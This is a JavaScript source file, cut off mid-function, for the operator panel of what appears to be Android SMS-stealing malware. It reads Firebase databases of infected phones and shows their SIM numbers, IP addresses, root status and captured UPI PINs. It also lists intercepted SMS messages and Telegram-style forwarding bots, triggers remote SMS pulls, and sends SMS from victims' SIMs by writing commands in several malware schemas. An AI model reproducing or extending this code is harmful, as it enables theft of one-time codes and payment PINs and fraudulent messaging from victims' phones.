import { databases, dbLabels } from "./config.js";
import { ref, onValue, off, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

// ─── STATE (nested per DB) ───
let currentActiveTab = 'clients';
let selectedDeviceFilter = 'all';       // "all" OR composite key "dbName::deviceId"
let structuralStatusFilter = 'all';
let clientsData = {};                   // { dbName: { devId: {...} } }
let messagesData = {};                  // { dbName: { devId: {...} } }
let botUsersData = {};                  // { dbName: { botId: {...} } }
let pinsData = {};                      // { dbName: { ... } }
let callForData = {};                   // kept for compatibility
let isMessagesLoaded = false;
let isClientsLoaded = false;

const DB_NAMES = Object.keys(databases);
DB_NAMES.forEach(n => {
    clientsData[n]  = {};
    messagesData[n] = {};
    botUsersData[n] = {};
    pinsData[n]     = {};
});

// ─── DOM REFS ───
const $ = id => document.getElementById(id);
const connectionUiStatus = $('connectionStatus');
const searchInputElement = $('panelSearchInput');
const deviceSearchInput = $('deviceSearchInput');
const currentSelectionLabel = $('currentSelectionLabel');
const deviceSidebarSection = $('deviceSidebarSection');
const deviceTabsListContainer = $('deviceTabsListContainer');
const exportDataBtn = $('exportDataBtn');
const triggerSmsFetchBtn = $('triggerSmsFetchBtn');
const activeDeviceFilterLabel = $('activeDeviceFilterLabel');
const toastNotificationContainer = $('toastNotificationContainer');
const menuDrawerToggleBtn = $('menuDrawerToggleBtn');
const drawerBackdropOverlay = $('drawerBackdropOverlay');
const closeDrawerBtn = $('closeDrawerBtn');
const smsMessagesContainer = $('smsMessagesContainer');

// ─── HELPERS ───
function isValidDeviceId(id) {
    return id && typeof id === 'string' && !(id.startsWith('{') && id.endsWith('}'));
}

const KEY_SEP = '::';
function makeKey(dbName, devId) { return `${dbName}${KEY_SEP}${devId}`; }
function parseKey(key) {
    const i = key.indexOf(KEY_SEP);
    if (i === -1) return { dbName: null, devId: key };
    return { dbName: key.slice(0, i), devId: key.slice(i + KEY_SEP.length) };
}
function dbLabel(name) { return dbLabels[name] || (name ? name.toUpperCase() : ''); }

function getPhoneNumbers(client) {
    const numbers = [];
    if (client.mobNo && client.mobNo.trim() && client.mobNo.trim() !== 'Unknown') {
        numbers.push(client.mobNo.trim());
    }
    if (client.sims && Array.isArray(client.sims)) {
        client.sims.forEach(sim => {
            if (sim && sim.phoneNumber && sim.phoneNumber.trim() && sim.phoneNumber.trim() !== 'Unknown') {
                const num = sim.phoneNumber.trim();
                if (!numbers.includes(num)) numbers.push(num);
            }
        });
    }
    return numbers.length > 0 ? numbers : null;
}

function getProviderLabel(client) {
    if (client.service_provider && client.service_provider.trim() && client.service_provider.trim() !== 'Unknown') {
        return client.service_provider.trim();
    }
    if (client.sims && Array.isArray(client.sims) && client.sims.length > 0) {
        const providers = client.sims.map(s => s.carrierName).filter(Boolean).filter(v => v !== 'Unknown');
        if (providers.length > 0) return providers.join(' | ');
    }
    return '—';
}

function getSimCount(client) {
    if (client.sims && Array.isArray(client.sims)) {
        return client.sims.filter(s => s && s.phoneNumber && s.phoneNumber !== 'Unknown').length;
    }
    return 0;
}

// ─── ATTACH LISTENERS FOR EVERY DATABASE ───
DB_NAMES.forEach(dbName => {
    const db = databases[dbName];

    onValue(ref(db, '/clients'), (snapshot) => {
        clientsData[dbName] = snapshot.val() || {};
        isClientsLoaded = true;
        onAnyUpdate();
    });

    onValue(ref(db, '/messages'), (snapshot) => {
        messagesData[dbName] = snapshot.val() || {};
        isMessagesLoaded = true;
        onAnyUpdate();
    });

    onValue(ref(db, '/bot_users'), (snapshot) => {
        botUsersData[dbName] = snapshot.val() || {};
        onAnyUpdate();
    });

    onValue(ref(db, '/pins'), (snapshot) => {
        pinsData[dbName] = snapshot.val() || {};
    });
});

function onAnyUpdate() {
    const anyLoaded = DB_NAMES.some(n => clientsData[n] && Object.keys(clientsData[n]).length >= 0);
    connectionUiStatus.innerHTML = anyLoaded
        ? `<span class="w-1 h-1 rounded-full bg-cyan-400"></span><span>LIVE SYNC · ${DB_NAMES.length} DB</span>`
        : `<span class="w-1 h-1 rounded-full bg-amber-400"></span><span>CONNECTING...</span>`;
    calculateDashboardMetrics();
    calculateBotCount();
    generateDeviceSidebarMenu();
    renderActiveTabContent();
}

// ─── METRICS ───
function calculateDashboardMetrics() {
    let active = 0, total = 0;
    DB_NAMES.forEach(dbName => {
        const bucket = clientsData[dbName] || {};
        Object.keys(bucket).forEach(k => {
            if (!isValidDeviceId(k)) return;
            total++;
            if (bucket[k] && bucket[k].status === true) active++;
        });
    });
    $('activeClientsCount').innerText = active;
    $('totalClientsCount').innerText = total;

    // SMS count across all DBs
    let smsCount = 0;
    DB_NAMES.forEach(dbName => {
        const bucket = messagesData[dbName] || {};
        Object.keys(bucket).forEach(devId => {
            if (bucket[devId]) smsCount += Object.keys(bucket[devId]).length;
        });
    });
    $('totalSMSCount').innerText = smsCount;
}

function calculateBotCount() {
    let total = 0;
    DB_NAMES.forEach(dbName => {
        total += Object.keys(botUsersData[dbName] || {}).length;
    });
    $('botUsersCount').innerText = total;
}

// ─── DRAWER ───
function toggleDrawer(show) {
    deviceSidebarSection.classList.toggle('-translate-x-full', !show);
    drawerBackdropOverlay.classList.toggle('hidden', !show);
}
menuDrawerToggleBtn.addEventListener('click', () => toggleDrawer(true));
drawerBackdropOverlay.addEventListener('click', () => toggleDrawer(false));
closeDrawerBtn.addEventListener('click', () => toggleDrawer(false));

// ─── SIDEBAR ───
function generateDeviceSidebarMenu() {
    // Build composite key set
    const devices = new Map(); // key -> { dbName, devId, online }
    DB_NAMES.forEach(dbName => {
        Object.keys(clientsData[dbName] || {}).forEach(devId => {
            if (!isValidDeviceId(devId)) return;
            const meta = clientsData[dbName][devId];
            devices.set(makeKey(dbName, devId), {
                dbName, devId,
                online: !!(meta && meta.status === true)
            });
        });
        Object.keys(messagesData[dbName] || {}).forEach(devId => {
            if (!isValidDeviceId(devId)) return;
            const k = makeKey(dbName, devId);
            if (!devices.has(k)) {
                const meta = clientsData[dbName]?.[devId];
                devices.set(k, { dbName, devId, online: !!(meta && meta.status === true) });
            }
        });
    });

    let html = `
        <button id="deviceTabBtn-all" class="w-full text-left px-3 py-2 rounded-xl text-[10px] font-mono font-black transition-all flex items-center justify-between ${selectedDeviceFilter === 'all' ? 'bg-slate-900 text-cyan-400 border border-slate-800' : 'text-slate-500 hover:text-slate-300'}" style="margin-bottom:4px">
            <div class="flex items-center space-x-1.5">
                <span class="material-icons text-xs">language</span>
                <span>ALL DEVICES (${devices.size})</span>
            </div>
            <span class="material-icons text-xs">public</span>
        </button>`;

    // Group by DB
    const byDb = {};
    devices.forEach((v, k) => {
        if (!byDb[v.dbName]) byDb[v.dbName] = [];
        byDb[v.dbName].push({ key: k, ...v });
    });

    Object.keys(byDb).sort().forEach(dbName => {
        html += `
            <div class="mt-3 mb-1 px-2 text-[9px] font-mono font-black tracking-widest text-cyan-500/80 uppercase flex items-center space-x-1">
                <span class="material-icons text-[10px]">storage</span>
                <span>${dbLabel(dbName)}</span>
            </div>`;

        byDb[dbName]
            .sort((a, b) => a.devId.localeCompare(b.devId))
            .forEach(d => {
                if (structuralStatusFilter === 'online' && !d.online) return;
                if (structuralStatusFilter === 'offline' && d.online) return;
                const sel = selectedDeviceFilter === d.key;
                const safeId = d.key.replace(/[^a-zA-Z0-9]/g, '_');
                html += `
                    <button id="dt-${safeId}" data-device-key="${d.key}" class="device-tab-item w-full text-left px-3 py-2 rounded-lg font-mono text-xs transition-all flex items-center justify-between group ${sel ? 'bg-slate-900 text-cyan-400 border border-slate-800 font-bold' : 'text-slate-500 hover:text-slate-300'}">
                        <div class="flex items-center space-x-1.5 overflow-hidden truncate">
                            <span class="material-icons text-xs ${d.online ? 'text-emerald-400' : 'text-slate-700'}">cell_tower</span>
                            <span class="truncate block">${d.devId}</span>
                        </div>
                        <span class="w-1 h-1 rounded-full flex-shrink-0 ${d.online ? 'bg-emerald-400' : 'bg-slate-800'}"></span>
                    </button>`;
            });
    });

    deviceTabsListContainer.innerHTML = html;

    const allBtn = $('deviceTabBtn-all');
    if (allBtn) allBtn.addEventListener('click', () => changeDeviceFilter('all'));

    deviceTabsListContainer.querySelectorAll('.device-tab-item').forEach(btn => {
        btn.addEventListener('click', () => changeDeviceFilter(btn.getAttribute('data-device-key')));
    });

    filterSidebarDeviceList();
}

function changeDeviceFilter(key) {
    selectedDeviceFilter = key;
    if (key === 'all') {
        currentSelectionLabel.innerText = 'Scope: Global View';
        activeDeviceFilterLabel.innerText = 'All Devices';
    } else {
        const { dbName, devId } = parseKey(key);
        currentSelectionLabel.innerText = `Scope: ${devId}`;
        activeDeviceFilterLabel.innerText = `${dbLabel(dbName)} · ${devId}`;
    }
    if (triggerSmsFetchBtn) triggerSmsFetchBtn.classList.toggle('hidden', key === 'all');

    const smsSendBtn = document.getElementById('triggerSmsSendBtn');
    if (smsSendBtn) smsSendBtn.classList.toggle('hidden', key === 'all');

    generateDeviceSidebarMenu();
    toggleDrawer(false);
    renderActiveTabContent();
}

function changeStatusFilter(mode) {
    structuralStatusFilter = mode;
    ['all','online','offline'].forEach(m => {
        const btn = $('statusFilterBtn-' + m);
        if (btn) btn.className = m === mode ? "subtab-pill subtab-pill-active" : "subtab-pill subtab-pill-inactive";
    });
    generateDeviceSidebarMenu();
}

$('statusFilterBtn-all').addEventListener('click', () => changeStatusFilter('all'));
$('statusFilterBtn-online').addEventListener('click', () => changeStatusFilter('online'));
$('statusFilterBtn-offline').addEventListener('click', () => changeStatusFilter('offline'));

// ─── BOTTOM NAV ───
window.switchTab = function(tab) {
    currentActiveTab = tab;
    ['clients','messages','bots','links'].forEach(t => {
        const btn = $('bottomTabBtn-' + t);
        const content = $('tabContent-' + t);
        if (t === tab) {
            btn.className = "bottom-nav-item bottom-nav-active";
            content.classList.remove('hidden');
        } else {
            btn.className = "bottom-nav-item bottom-nav-inactive";
            content.classList.add('hidden');
        }
    });
    searchInputElement.value = "";
    renderActiveTabContent();
};

['clients','messages','bots','links'].forEach(t => {
    const btn = $('bottomTabBtn-' + t);
    if (btn) btn.addEventListener('click', () => window.switchTab(t));
});

searchInputElement.addEventListener('input', () => executeClientSideSearch());
deviceSearchInput.addEventListener('input', () => filterSidebarDeviceList());

// ─── SMS FETCH ───
triggerSmsFetchBtn.addEventListener('click', async () => {
    if (selectedDeviceFilter === 'all') return;
    const { dbName, devId } = parseKey(selectedDeviceFilter);
    const db = databases[dbName];
    if (!db) return;
    try {
        triggerSmsFetchBtn.disabled = true;
        await set(ref(db, `/smsQueue/${devId}/remote_fetch_trigger`), {
            action: "PULL_LATEST_SMS_LOGS", timestamp: Date.now(), status: "pending"
        });
        toast(`Command dispatched to ${devId}`, "success");
    } catch (err) {
        toast("Failed to dispatch — DB rules may block writes", "error");
    } finally {
        setTimeout(() => { triggerSmsFetchBtn.disabled = false; }, 3000);
    }
});

// ─── EXPORT ───
exportDataBtn.addEventListener('click', () => {
    const payload = {
        clients: clientsData,
        messages: messagesData,
        bot_users: botUsersData,
        pins: pinsData
    };
    const blob = new Blob([JSON.stringify(payload, null, 4)], {type: 'application/json'});
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `export_${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(a.href);
    toast("Export downloaded successfully", "success");
});

// ─── RENDER ROUTER ───
function renderActiveTabContent() {
    switch(currentActiveTab) {
        case 'clients':
            if (isClientsLoaded) generateClientsView();
            else $('clientsContainer').innerHTML = `<div class="col-span-full status-placeholder">Loading hardware profiles...</div>`;
            break;
        case 'messages':
            if (isMessagesLoaded) generateSmsHubView();
            else smsMessagesContainer.innerHTML = `<div class="status-placeholder">Loading message logs...</div>`;
            break;
        case 'bots':
            generateBotsView();
            break;
        case 'links':
            $('linksTableBody').innerHTML = `<tr><td colspan="3" class="p-4 text-center text-slate-600 text-xs">No proxy links records available for this database.</td></tr>`;
            break;
    }
}

// ════════════════════════════════════
// ─── CLIENTS VIEW ───
// ════════════════════════════════════
function generateClientsView() {
    const container = $('clientsContainer');

    const flat = [];
    DB_NAMES.forEach(dbName => {
        const bucket = clientsData[dbName] || {};
        Object.keys(bucket).forEach(devId => {
            if (!isValidDeviceId(devId)) return;
            flat.push({ dbName, devId, item: bucket[devId], key: makeKey(dbName, devId) });
        });
    });

    if (flat.length === 0) {
        container.innerHTML = `<div class="col-span-full status-placeholder">No hardware profiles available.</div>`;
        return;
    }

    flat.sort((a, b) => a.dbName.localeCompare(b.dbName) || a.devId.localeCompare(b.devId));

    let html = '';
    flat.forEach(({ dbName, devId, item, key }) => {
        if (selectedDeviceFilter !== 'all' && selectedDeviceFilter !== key) return;
        if (!item) return;

        const isOnline = item.status === true;
        if (structuralStatusFilter !== 'all') {
            if (structuralStatusFilter === 'online' && !isOnline) return;
            if (structuralStatusFilter === 'offline' && isOnline) return;
        }

        const battery = (item.battery || '0').toString().replace('%', '');
        const model = item.modelName || 'Unknown Device';
        const storage = item.storage || '—';
        const androidVer = item.androidV ? 'API ' + item.androidV : 'Base';
        const ipAddr = item.ip_address || '—';
        const joined = item.joined || '—';
        const isRooted = item.isRoot === true;

        const phoneNumbers = getPhoneNumbers(item);
        const phoneDisplay = phoneNumbers
            ? phoneNumbers.map((n, i) => `<span class="bg-slate-950/50 px-1.5 py-0.5 rounded border border-slate-800/60">SIM${i+1}: ${n}</span>`).join(' ')
            : `<span class="bg-slate-950/50 px-1.5 py-0.5 rounded border border-slate-800/60">📱 —</span>`;

        const providerDisplay = getProviderLabel(item);
        const upipin = item.upipin || null;
        const simCount = getSimCount(item);
        const cpuArch = item.cpu_arch || '—';

        html += `
            <div data-id="${key}" class="client-interactive-card bg-slate-900/40 p-3 rounded-xl border ${isOnline ? 'live-glow-active border-emerald-500/20' : 'border-slate-900'} shadow flex flex-col space-y-2.5 cursor-pointer" data-search-blob="${dbName.toLowerCase()} ${devId.toLowerCase()} ${model.toLowerCase()}">
                <div class="flex items-start justify-between gap-2">
                    <div class="overflow-hidden flex-1 min-w-0">
                        <div class="text-[9px] font-mono font-bold text-slate-500 tracking-wider flex items-center space-x-1.5 uppercase flex-wrap gap-y-1">
                            <span class="material-icons text-[10px] text-cyan-400">touch_app</span>
                            <span class="bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 px-1 py-0.5 rounded text-[8px] font-bold">${dbLabel(dbName)}</span>
                            ${isRooted ? `<span class="bg-rose-500/10 text-rose-400 border border-rose-500/10 px-1 py-0.5 rounded text-[8px] font-bold">ROOTED</span>` : ''}
                            ${simCount > 1 ? `<span class="bg-purple-500/10 text-purple-400 border border-purple-500/10 px-1 py-0.5 rounded text-[8px] font-bold">${simCount}SIM</span>` : ''}
                            ${item.isSdCard ? `<span class="bg-blue-500/10 text-blue-400 border border-blue-500/10 px-1 py-0.5 rounded text-[8px] font-bold">SD</span>` : ''}
                        </div>
                        <div class="text-xs font-bold text-slate-200 font-mono break-all mt-0.5">${devId}</div>
                        <div class="text-[9px] text-slate-500 font-mono mt-0.5 truncate">${model}</div>
                    </div>
                    <span class="text-[9px] font-bold px-1.5 py-0.5 rounded flex-shrink-0 ${isOnline ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/10' : 'bg-slate-800 text-slate-500 border border-slate-700'}">
                        ${isOnline ? 'ONLINE' : 'OFFLINE'}
                    </span>
                </div>

                <div class="grid grid-cols-3 gap-1.5 text-center font-mono text-[11px]">
                    <div class="bg-slate-950/60 p-1.5 rounded-lg border border-slate-900">
                        <div class="text-[8px] text-slate-500 uppercase font-sans font-bold">Battery</div>
                        <div class="text-slate-200 font-bold mt-0.5">${battery}%</div>
                    </div>
                    <div class="bg-slate-950/60 p-1.5 rounded-lg border border-slate-900">
                        <div class="text-[8px] text-slate-500 uppercase font-sans font-bold">Storage</div>
                        <div class="text-cyan-400 font-bold mt-0.5">${storage}</div>
                    </div>
                    <div class="bg-slate-950/60 p-1.5 rounded-lg border border-slate-900">
                        <div class="text-[8px] text-slate-500 uppercase font-sans font-bold">Android</div>
                        <div class="text-slate-400 font-bold mt-0.5">${androidVer}</div>
                    </div>
                    ${item.sdkV ? `
                    <div class="bg-slate-950/60 p-1.5 rounded-lg border border-slate-900">
                        <div class="text-[8px] text-slate-500 uppercase font-sans font-bold">SDK</div>
                        <div class="text-slate-400 font-bold mt-0.5">${item.sdkV}</div>
                    </div>` : ''}
                    <div class="bg-slate-950/60 p-1.5 rounded-lg border border-slate-900">
                        <div class="text-[8px] text-slate-500 uppercase font-sans font-bold">Arch</div>
                        <div class="text-slate-400 font-bold mt-0.5 truncate">${cpuArch}</div>
                    </div>
                    ${upipin ? `
                    <div class="bg-amber-500/10 p-1.5 rounded-lg border border-amber-600/30 col-span-3">
                        <div class="text-[8px] text-amber-400 uppercase font-sans font-bold">🔑 UPI PIN</div>
                        <div class="text-amber-300 font-bold mt-0.5 text-xs tracking-widest select-all">${upipin}</div>
                    </div>` : ''}
                </div>

                <div class="flex flex-wrap gap-1 text-[9px] text-slate-500 font-mono border-t border-slate-800/40 pt-2">
                    ${phoneDisplay}
                    <span class="bg-slate-950/50 px-1.5 py-0.5 rounded border border-slate-800/60">📡 ${providerDisplay}</span>
                    <span class="bg-slate-950/50 px-1.5 py-0.5 rounded border border-slate-800/60">🌐 ${ipAddr}</span>
                    <span class="bg-slate-950/50 px-1.5 py-0.5 rounded border border-slate-800/60">📅 ${joined}</span>
                </div>
            </div>`;
    });

    container.innerHTML = html || `<div class="col-span-full status-placeholder">No matching devices found.</div>`;

    container.querySelectorAll('.client-interactive-card').forEach(card => {
        card.addEventListener('click', function() {
            const key = this.getAttribute('data-id');
            changeDeviceFilter(key);
            window.switchTab('messages');
        });
    });
}

// ════════════════════════════════════
// ─── SMS VIEW ───
// ════════════════════════════════════
function generateSmsHubView() {
    const container = smsMessagesContainer;

    const messages = [];

    DB_NAMES.forEach(dbName => {
        const smsNode = messagesData[dbName] || {};
        Object.keys(smsNode).forEach(hwId => {
            if (!isValidDeviceId(hwId)) return;
            const key = makeKey(dbName, hwId);
            if (selectedDeviceFilter !== 'all' && selectedDeviceFilter !== key) return;

            const userLogs = smsNode[hwId];
            if (!userLogs) return;

            Object.keys(userLogs).forEach(msgKey => {
                const entry = userLogs[msgKey];
                if (!entry) return;

                let ts = 0;
                const keyNum = parseInt(msgKey);
                if (keyNum > 1000000000000) ts = keyNum;
                if (!ts && entry.id) ts = parseInt(entry.id);
                if (!ts) ts = entry.ts || entry.timestamp || 0;

                messages.push({
                    dbName,
                    deviceId: hwId,
                    sender: entry.sender || 'Unknown',
                    message: entry.message || entry.text || entry.body || '',
                    dateTime: entry.dateTime || entry.time || entry.recivedDate || '',
                    type: entry.type || 'RAW',
                    timestamp: ts,
                    id: msgKey
                });
            });
        });
    });

    if (messages.length === 0) {
        container.innerHTML = `<div class="status-placeholder">No messages match the current filter.</div>`;
        return;
    }

    messages.sort((a, b) => b.timestamp - a.timestamp);

    const MAX = 300;
    const display = messages.length > MAX ? messages.slice(0, MAX) : messages;
    const hidden = messages.length - MAX;

    let html = '';
    let lastGroup = '';

    display.forEach(m => {
        const groupKey = makeKey(m.dbName, m.deviceId);
        if (selectedDeviceFilter === 'all' && groupKey !== lastGroup) {
            if (lastGroup !== '') html += `<div class="border-t border-slate-800/30 my-2"></div>`;
            html += `<div class="flex items-center space-x-1.5 px-1 py-1">
                <span class="material-icons text-xs text-cyan-500">cell_tower</span>
                <span class="text-[9px] font-bold font-mono text-slate-500 border border-slate-800 px-1 py-0.5 rounded">${dbLabel(m.dbName)}</span>
                <span class="text-[10px] font-bold font-mono text-cyan-400 uppercase tracking-wider">${m.deviceId}</span>
            </div>`;
            lastGroup = groupKey;
        }

        const isIncoming = m.type === 'incoming' || m.type === 'INCOMING';

        html += `
            <div class="bg-slate-900/40 p-3 rounded-xl border border-slate-900 shadow-sm space-y-1.5" data-search-blob="${m.dbName.toLowerCase()} ${(m.sender||'').toLowerCase()} ${(m.message||'').toLowerCase()} ${(m.deviceId||'').toLowerCase()}">
                <div class="flex items-center justify-between gap-2">
                    <div class="flex items-center space-x-1.5 overflow-hidden min-w-0">
                        <span class="${isIncoming ? 'bg-emerald-500/10 text-emerald-400' : 'bg-amber-500/10 text-amber-400'} p-1 rounded-md border border-slate-800 flex items-center justify-center flex-shrink-0">
                            <span class="material-icons text-xs">${isIncoming ? 'call_received' : 'call_made'}</span>
                        </span>
                        <span class="text-xs font-bold text-slate-200 font-mono select-all truncate">${m.sender}</span>
                    </div>
                    <span class="text-[9px] font-mono text-slate-500 bg-slate-950 px-1.5 py-0.5 rounded border border-slate-800/60 flex-shrink-0">${m.dateTime}</span>
                </div>
                <p class="text-xs bg-slate-950 p-2 rounded-lg border border-slate-900 text-slate-300 font-mono break-all select-all leading-relaxed">${m.message}</p>
                <div class="flex items-center justify-between text-[9px] font-mono">
                    <span class="text-slate-500">Device: <span class="text-cyan-500 font-bold select-all">${m.deviceId}</span></span>
                    <span class="uppercase font-black px-1.5 rounded ${isIncoming ? 'bg-emerald-500/5 text-emerald-400' : 'bg-amber-500/5 text-amber-400'}">${isIncoming ? 'INCOMING' : 'OUTGOING'}</span>
                </div>
            </div>`;
    });

    if (hidden > 0) {
        html += `<div class="text-center text-[10px] text-slate-600 font-mono py-2 border-t border-slate-800/30">
            Showing ${MAX} of ${messages.length} messages. ${hidden} older messages hidden.
        </div>`;
    }

    container.innerHTML = html;
}

// ════════════════════════════════════
// ─── BOTS VIEW ───
// ════════════════════════════════════
function generateBotsView() {
    const tbody = $('botsTableBody');

    const rows = [];
    DB_NAMES.forEach(dbName => {
        const bots = botUsersData[dbName] || {};
        Object.keys(bots).forEach(botId => {
            rows.push({ dbName, botId, bot: bots[botId] });
        });
    });

    if (rows.length === 0) {
        tbody.innerHTML = `<tr><td colspan="4" class="p-4 text-center text-slate-600 text-xs">No relay gateways configured in this database.</td></tr>`;
        return;
    }

    let html = '';
    rows.forEach(({ dbName, botId, bot }) => {
        if (!bot) return;
        html += `
            <tr class="hover:bg-slate-900/40 transition">
                <td class="p-3">
                    <span class="text-cyan-400 font-bold">${botId}</span>
                    <span class="ml-2 text-[9px] font-mono text-slate-500 border border-slate-800 px-1 py-0.5 rounded">${dbLabel(dbName)}</span>
                </td>
                <td class="p-3 text-slate-300">${bot.target_channel_id || '—'}</td>
                <td class="p-3 text-slate-400">${bot.target_channel_label || '—'}</td>
                <td class="p-3 text-emerald-400">${bot.forward_number || '—'}</td>
            </tr>`;
    });

    tbody.innerHTML = html;
}

// ─── SEARCH ───
function filterSidebarDeviceList() {
    const q = (deviceSearchInput.value || '').toLowerCase().trim();
    deviceTabsListContainer.querySelectorAll('.device-tab-item').forEach(btn => {
        const key = (btn.getAttribute('data-device-key') || '').toLowerCase();
        btn.style.display = key.includes(q) ? '' : 'none';
    });
}

function executeClientSideSearch() {
    const q = (searchInputElement.value || '').toLowerCase().trim();
    let container, selector;
    if (currentActiveTab === 'clients') { container = $('clientsContainer'); selector = '[data-search-blob]'; }
    else if (currentActiveTab === 'messages') { container = smsMessagesContainer; selector = '[data-search-blob]'; }
    else return;

    if (!container) return;
    container.querySelectorAll(selector).forEach(el => {
        const blob = el.getAttribute('data-search-blob') || '';
        el.style.display = blob.includes(q) ? '' : 'none';
    });
}

// ─── TOAST ───
function toast(msg, type = "info") {
    const el = document.createElement('div');
    el.className = `p-2.5 rounded-xl border shadow-2xl font-mono text-[10px] font-bold flex items-center space-x-2 transition-all duration-300 translate-y-2 bg-slate-950 pointer-events-auto ${
        type === 'success' ? 'border-emerald-500/20 text-emerald-400' :
        type === 'error' ? 'border-rose-500/20 text-rose-400' : 'border-slate-800 text-cyan-400'
    }`;
    el.innerHTML = `<span class="material-icons text-xs">notifications</span><span>${msg}</span>`;
    toastNotificationContainer.appendChild(el);
    requestAnimationFrame(() => el.classList.remove('translate-y-2'));
    setTimeout(() => {
        el.classList.add('opacity-0', 'translate-y-1');
        setTimeout(() => el.remove(), 300);
    }, 3500);
}

// ════════════════════════════════════
// ─── SEND SMS FEATURE ───
// ════════════════════════════════════

// ─── AUTO-DETECT DB TYPE ───
function detectDBType(client) {
    if (!client) return 1;
    if (client.Sim1 !== undefined || client.device_name !== undefined || client.charge !== undefined) return 3;
    if (client.sendSms !== undefined) return 2;
    return 1;
}

// ─── SEND SMS PANEL ───
function createSendSmsPanel() {
    if (document.getElementById('sendSmsPanel')) return;

    const panel = document.createElement('div');
    panel.id = 'sendSmsPanel';
    panel.className = 'fixed bottom-20 right-4 z-50 bg-slate-900/95 backdrop-blur-xl border border-slate-800 rounded-2xl shadow-2xl p-4 w-80';
    panel.style.display = 'none';
    panel.innerHTML = `
        <div class="flex items-center justify-between mb-3">
            <div>
                <div class="text-[10px] font-mono font-bold text-cyan-400 uppercase tracking-wider">Send SMS</div>
                <div id="sendSmsTargetLabel" class="text-[9px] font-mono text-slate-500 truncate mt-0.5">Target: —</div>
            </div>
            <button id="closeSendSmsPanelBtn" class="text-slate-600 hover:text-slate-300 transition p-1">
                <span class="material-icons text-sm">close</span>
            </button>
        </div>
        <div class="space-y-2.5">
            <input id="sendSmsNumberInput" type="text" placeholder="+919876543210" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs font-mono text-slate-200 placeholder-slate-600 outline-none focus:border-cyan-500/50 transition">
            <textarea id="sendSmsBodyInput" rows="3" placeholder="Type your message..." class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs font-mono text-slate-200 placeholder-slate-600 outline-none focus:border-cyan-500/50 transition resize-none"></textarea>
            <div class="flex items-center space-x-2">
                <button id="executeSmsSendBtn" class="flex-1 bg-cyan-500/10 hover:bg-cyan-500/20 border border-cyan-500/30 text-cyan-400 font-bold text-[10px] font-mono rounded-xl px-3 py-2.5 transition flex items-center justify-center space-x-1.5">
                    <span class="material-icons text-sm">rocket_launch</span>
                    <span>Send to ALL SIMs</span>
                </button>
            </div>
            <div id="sendSmsFeedback" class="text-[9px] font-mono text-slate-500 text-center hidden"></div>
        </div>
    `;
    document.body.appendChild(panel);

    document.getElementById('closeSendSmsPanelBtn').addEventListener('click', () => {
        document.getElementById('sendSmsPanel').style.display = 'none';
    });

    document.getElementById('executeSmsSendBtn').addEventListener('click', executeSmsSend);
}

// ─── EXECUTE SEND SMS ───
async function executeSmsSend() {
    const toNumber = document.getElementById('sendSmsNumberInput').value.trim();
    const message = document.getElementById('sendSmsBodyInput').value.trim();

    if (!toNumber) { toast('Enter a phone number', 'error'); return; }
    if (!message) { toast('Enter a message body', 'error'); return; }
    if (!selectedDeviceFilter || selectedDeviceFilter === 'all') { toast('Select a specific device first', 'error'); return; }

    const { dbName, devId } = parseKey(selectedDeviceFilter);
    const db = databases[dbName];
    if (!db) { toast(`Unknown database: ${dbName}`, 'error'); return; }

    const btn = document.getElementById('executeSmsSendBtn');
    const feedback = document.getElementById('sendSmsFeedback');

    btn.disabled = true;
    btn.innerHTML = '<span class="material-icons text-sm">sync</span><span>Sending...</span>';
    feedback.className = 'text-[9px] font-mono text-slate-500 text-center';
    feedback.style.display = 'block';
    feedback.textContent = `Dispatching to ${dbLabel(dbName)}...`;

    const client = clientsData[dbName]?.[devId];
    const dbType = detectDBType(client);
    const sims = getPhoneNumbers(client);
    const simCount = sims ? sims.length : 1;

    try {
        let successCount = 0;
        let errorCount = 0;

        for (let i = 0; i < simCount; i++) {
            const simSlot = i + 1;
            try {
                if (dbType === 3) {
                    const simSlotIndex = String(i);
                    await Promise.all([
                        set(ref(db, `system/panel/${devId}/panel`), {
                            number: toNumber, slot: simSlotIndex, sms: message, timestamp: Date.now()
                        }),
                        set(ref(db, `data/${devId}/sendSms`).push(), {
                            to: toNumber, message: message, sim: simSlot, timestamp: Date.now(), status: 'pending'
                        }),
                        set(ref(db, `common/sendCommand/${devId}`).push(), {
                            type: 'sendSMS', to: toNumber, message: message, sim: simSlot, timestamp: Date.now()
                        })
                    ]);
                    successCount++;
                } else if (dbType === 2) {
                    const cmdId = `cmd_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
                    await Promise.all([
                        set(ref(db, `device_commands/${devId}/${cmdId}`), {
                            sendSms: { body: message, sim: simSlot, to: toNumber },
                            status: 'pending', timestamp: Date.now()
                        }),
                        set(ref(db, `commands/${devId}`).push(), {
                            id: cmdId, message: message, sim: simSlot, timestamp: Date.now(), to: toNumber, type: 'sendSMS'
                        }),
                        set(ref(db, `${devId}/pending_cmd`), {
                            body: message, command: 'sendSMS', command2: 'send_sms', command3: 'send message',
                            message: message, messageText: message, number: toNumber, phoneNumber: toNumber,
                            sim: simSlot, simSlot: String(simSlot - 1), targetDeviceId: devId,
                            timestamp: Date.now(), to: toNumber
                        }),
                        set(ref(db, `${devId}/cmd`).push(), {
                            id: cmdId, message: message, sim: simSlot, timestamp: Date.now(), to: toNumber, type: 'sendSMS'
                        })
                    ]);
                    successCount++;
                } else {
                    await Promise.all([
                        set(ref(db, `clients/${devId}/webhookEvent/sendSms`), {
                            from: simSlot, to: toNumber, message: message, isSended: false
                        }),
                        set(ref(db, `smsQueue/${devId}/remote_fetch_trigger`), {
                            action: 'SEND_SMS', to: toNumber, message: message, sim: simSlot,
                            timestamp: Date.now(), status: 'pending'
                        })
                    ]);
                    successCount++;
                }
            } catch(e) {
                errorCount++;
            }
        }

        const resultMsg = successCount > 0
            ? `Sent to ${successCount} SIM(s) on ${dbLabel(dbName)}${errorCount > 0 ? ` (${errorCount} failed)` : ''}`
            : `Failed (${errorCount} errors)`;

        feedback.textContent = resultMsg;
        feedback.style.color = successCount > 0 ? '#34d399' : '#fb7185';
        toast(resultMsg, successCount === 0 ? 'error' : 'success');

        if (successCount > 0) {
            document.getElementById('sendSmsNumberInput').value = '';
            document.getElementById('sendSmsBodyInput').value = '';
